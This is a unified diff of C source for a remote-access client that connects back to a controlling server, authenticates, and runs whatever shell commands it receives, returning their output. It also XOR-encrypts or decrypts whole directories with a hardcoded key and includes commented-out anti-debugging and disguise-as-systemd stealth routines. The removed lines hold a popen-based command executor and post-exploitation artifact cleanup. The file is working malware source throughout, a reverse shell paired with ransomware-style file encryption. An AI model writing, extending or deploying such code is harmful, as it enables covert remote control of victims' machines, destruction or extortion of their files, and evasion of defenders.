@@ -1,69 +1,42 @@
 #include "client_base.h"
-#include "postexp.h"
 #include "anti_debug.h"
 #include "stealth.h"
 #include "crypto.h"
+#include "postexp.h"
 
+#define DEFAULT_PORT 8080
+#define DEFAULT_IP "127.0.0.1"
 #define BUFFER_SIZE 1024
-#define RECRYPT_EXTENSION ".RECRYPT"
 
-void execute_command_in_shell(const char *shell_path, const char *command, int sockfd) {
-    char output_buffer[BUFFER_SIZE];
-    FILE *fp;
-    char exec_command[BUFFER_SIZE];
-
-    snprintf(exec_command, sizeof(exec_command), "%s -c \"%s\"", shell_path, command);
-
-    fp = popen(exec_command, "r");
-    if (fp == NULL) {
-        snprintf(output_buffer, BUFFER_SIZE, "Failed to execute command: %s\n", command);
-        send(sockfd, output_buffer, strlen(output_buffer), 0);
-        return;
+void send_shell_type(int sockfd) {
+    const char *shell = access("/bin/bash", X_OK) == 0 ? "/bin/bash" : "/bin/sh";
+    if (send(sockfd, shell, strlen(shell), 0) < 0) {
+        perror("Error sending shell type to server");
+    } else {
+        printf("Sent shell type: %s\n", shell);
     }
-
-    // Send command output line by line to the server
-    while (fgets(output_buffer, sizeof(output_buffer), fp) != NULL) {
-        send(sockfd, output_buffer, strlen(output_buffer), 0);
-    }
-
-    pclose(fp);
-
-    // Signal end of output to the server
-    snprintf(output_buffer, BUFFER_SIZE, "[END_OF_OUTPUT]\n");
-    send(sockfd, output_buffer, strlen(output_buffer), 0);
 }
 
 int main(int argc, char *argv[]) {
     int sockfd;
-    char *server_ip = NULL;
-    int server_port = 0;
-    char *password = NULL;
-    char *encrypt_dir = NULL;
-    char *decrypt_dir = NULL;
-    char *xor_key = NULL;
-    char detected_shell[BUFFER_SIZE];
-    char recv_buffer[BUFFER_SIZE];
+    struct sockaddr_in server_addr;
+    char ip[BUFFER_SIZE] = DEFAULT_IP;
+    int port = DEFAULT_PORT;
+    char password[BUFFER_SIZE] = "";
+    char xor_key[BUFFER_SIZE] = "mysecretpass1";
+    char *encrypt_dir = NULL, *decrypt_dir = NULL;
+
     int opt;
-
-    // Anti-debugging measures
-    // anti_debug_ptrace();
-    // anti_debug_proc();
-
-    // Stealth measures
-    // rename_process("systemp");
-    // change_cmdline("systemp");
-
-    // Parse command-line arguments
     while ((opt = getopt(argc, argv, "i:p:w:e:d:k:")) != -1) {
         switch (opt) {
             case 'i':
-                server_ip = optarg;
+                strncpy(ip, optarg, BUFFER_SIZE);
                 break;
             case 'p':
-                server_port = atoi(optarg);
+                port = atoi(optarg);
                 break;
             case 'w':
-                password = optarg;
+                strncpy(password, optarg, BUFFER_SIZE);
                 break;
             case 'e':
                 encrypt_dir = optarg;
@@ -72,21 +45,14 @@ int main(int argc, char *argv[]) {
                 decrypt_dir = optarg;
                 break;
             case 'k':
-                xor_key = optarg;
+                strncpy(xor_key, optarg, BUFFER_SIZE);
                 break;
             default:
-                print_usage(argv[0]);
-                return EXIT_FAILURE;
+                print_usage(argv[0]); // Call from client_base.c
+                exit(EXIT_FAILURE);
         }
     }
 
-    // Validate required arguments
-    if (!server_ip || server_port <= 0 || !password) {
-        print_usage(argv[0]);
-        return EXIT_FAILURE;
-    }
-
-    // Check for encryption or decryption flags
     if (encrypt_dir && decrypt_dir) {
         fprintf(stderr, "Error: Cannot specify both -e (encrypt) and -d (decrypt) simultaneously.\n");
         print_usage(argv[0]);
@@ -95,71 +61,74 @@ int main(int argc, char *argv[]) {
 
     if (encrypt_dir) {
         printf("Encrypting files in directory: %s\n", encrypt_dir);
-        process_directory(encrypt_dir, xor_key ? xor_key : "default_key", 0); // Encryption mode
+        process_directory(encrypt_dir, xor_key, 0); // Encryption mode
         return 0;
     }
 
     if (decrypt_dir) {
         printf("Decrypting files in directory: %s\n", decrypt_dir);
-        process_directory(decrypt_dir, xor_key ? xor_key : "default_key", 1); // Decryption mode
+        process_directory(decrypt_dir, xor_key, 1); // Decryption mode
         return 0;
     }
 
-    // Initialize connection
-    sockfd = initialize_connection(server_ip, server_port);
+    // Anti-debugging measures
+    // anti_debug_ptrace();
+    // anti_debug_proc();
+
+    // Stealth measures
+    // rename_process("systemd");
+    // change_cmdline("systemd");
+
+    // Create a socket
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0) {
-        fprintf(stderr, "Failed to initialize connection.\n");
-        return EXIT_FAILURE;
+        error_exit("Error creating socket");
     }
+
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(port);
+
+    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
+        error_exit("Invalid IP address");
+    }
+
+    // Connect to the server
+    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+        error_exit("Connection to server failed");
+    }
+    printf("Connected to server at %s:%d\n", ip, port);
 
     // Authenticate with the server
     if (!authenticate(sockfd, password)) {
-        fprintf(stderr, "Authentication failed.\n");
         close(sockfd);
-        return EXIT_FAILURE;
+        return 1;
     }
 
-    printf("Authentication successful. Connected to server.\n");
+    // Send shell type to the server
+    send_shell_type(sockfd);
 
-    // Detect available shell
-    if (detect_shell(detected_shell, sizeof(detected_shell)) < 0) {
-        fprintf(stderr, "No supported shell found. Exiting.\n");
-        close(sockfd);
-        return EXIT_FAILURE;
-    }
-
-    // Notify server about the detected shell
-    send(sockfd, detected_shell, strlen(detected_shell), 0);
-    printf("Using shell: %s\n", detected_shell);
-
-    // Main loop for receiving commands and sending output
+    // Main loop for receiving and executing commands
+    char command_buffer[BUFFER_SIZE];
     while (1) {
-        ssize_t received = recv(sockfd, recv_buffer, BUFFER_SIZE - 1, 0);
-        if (received < 0) {
-            perror("Receive failed");
-            break;
-        } else if (received == 0) {
-            printf("Server closed the connection.\n");
+        ssize_t bytes_received = recv(sockfd, command_buffer, BUFFER_SIZE - 1, 0);
+        if (bytes_received <= 0) {
+            perror("Error receiving command or connection closed by server");
             break;
         }
 
-        recv_buffer[received] = '\0';
+        command_buffer[bytes_received] = '\0';
+        printf("Received command: %s\n", command_buffer);
 
-        // Handle "run <command>" format
-        if (strncmp(recv_buffer, "run ", 4) == 0) {
-            char *command = recv_buffer + 4;
-            printf("Executing command: %s\n", command);
-            execute_command_in_shell(detected_shell, command, sockfd);
-        } else if (strcmp(recv_buffer, "exit\n") == 0 || strcmp(recv_buffer, "quit\n") == 0) {
+        if (strcmp(command_buffer, "exit") == 0) {
             printf("Exiting on server request...\n");
             break;
         }
+
+        // Execute the received command and send the output back
+        execute_command_and_send_output(command_buffer, sockfd);
     }
 
-    // Post-exploitation cleanup
-    clean_artifacts();
-
-    // Clean up
     close(sockfd);
     printf("Disconnected from server.\n");
     return 0;
